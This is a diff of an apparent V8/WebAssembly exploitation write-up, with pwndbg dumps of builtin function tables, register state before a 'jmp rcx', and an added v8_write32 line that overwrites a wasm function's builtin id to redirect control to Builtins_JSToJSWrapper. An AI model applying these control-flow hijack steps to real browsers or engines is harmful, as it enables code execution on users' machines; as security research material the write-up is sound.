@@ -830,14 +830,28 @@ pwndbg> tele 0x7fff98000000+0x15fc0
 07:0038│  0x7fff98015ff8 —▸ 0x328e0003c26c ◂— 0x2bfe0100000d61 /* 'a\r' */
 
 ```
-`rdi` is wasm exported function `func1`
-`$rdi+0xb` is a id decoder function ->  `Builtins_JSToWasmWrapper`
-if we changes this value, we can point rcx to whatever functions...
+`rdi` is wasm exported function `func1`. `$rdi+0xb` is a id decoder function ->  `Builtins_JSToWasmWrapper`. if we changes this value, we can point rcx to whatever functions on tables.
 
-**How to exploit it?**
+This is `Builtin_*` tables:
 
-Bruteforce
-State before `jump rcx`
+```js
+pwndbg> tele 0x7fff98000000+0x15000
+00:0000│  0x7fff98015000 —▸ 0x555556bfc700 (Builtins_MathLog) ◂— push rbp
+01:0008│  0x7fff98015008 —▸ 0x30a4000386a8 ◂— 0x2a000100000d61 /* 'a\r' */
+02:0010│  0x7fff98015010 —▸ 0x555556bfc840 (Builtins_MathLog1p) ◂— push rbp
+03:0018│  0x7fff98015018 —▸ 0x30a4000386e4 ◂— 0x2a020100000d61 /* 'a\r' */
+04:0020│  0x7fff98015020 —▸ 0x555556bfc980 (Builtins_MathLog10) ◂— push rbp
+05:0028│  0x7fff98015028 —▸ 0x30a400038720 ◂— 0x2a040100000d61 /* 'a\r' */
+06:0030│  0x7fff98015030 —▸ 0x555556bfcac0 (Builtins_MathLog2) ◂— push rbp
+07:0038│  0x7fff98015038 —▸ 0x30a40003875c ◂— 0x2a060100000d61 /* 'a\r' */
+// ... more ...
+//==============================
+```
+
+**How to exploit it? Bruteforce??**
+
+Program's state before `jump rcx`
+
 ```go
 pwndbg> 
 0x0000555556ae74d7 in Builtins_CallFunction_ReceiverIsAny ()
@@ -867,9 +881,12 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  ► 0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    rcx   
 ```
 
-**Solution 1**
+**Solution 1: Jumping to `Builtins_JSToJSWrapper` function**
+
+Changing some fields to make program works
 
 ```js
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - 0x200); // jump Builtins_JSToJSWrapper
 // =============== jump to Builtins_JSToJSWrapper ====================
 // RDI  0x3e3a001dccfd ◂— 0x2500000725001923
 // RSI  0x3e3a00181729 ◂— 0x450000024e001817
@@ -883,20 +900,7 @@ v8_write32(0x2f0000+0x13, 0x500-7)
 // 0x1984f1
 // ==================================================================
 ```
-Some functions we can jump:
-```js
-pwndbg> tele 0x7fff98000000+0x15000
-00:0000│  0x7fff98015000 —▸ 0x555556bfc700 (Builtins_MathLog) ◂— push rbp
-01:0008│  0x7fff98015008 —▸ 0x30a4000386a8 ◂— 0x2a000100000d61 /* 'a\r' */
-02:0010│  0x7fff98015010 —▸ 0x555556bfc840 (Builtins_MathLog1p) ◂— push rbp
-03:0018│  0x7fff98015018 —▸ 0x30a4000386e4 ◂— 0x2a020100000d61 /* 'a\r' */
-04:0020│  0x7fff98015020 —▸ 0x555556bfc980 (Builtins_MathLog10) ◂— push rbp
-05:0028│  0x7fff98015028 —▸ 0x30a400038720 ◂— 0x2a040100000d61 /* 'a\r' */
-06:0030│  0x7fff98015030 —▸ 0x555556bfcac0 (Builtins_MathLog2) ◂— push rbp
-07:0038│  0x7fff98015038 —▸ 0x30a40003875c ◂— 0x2a060100000d61 /* 'a\r' */
-// ... more ...
-//==============================
-```
+
 
 Some interesting functions:
 
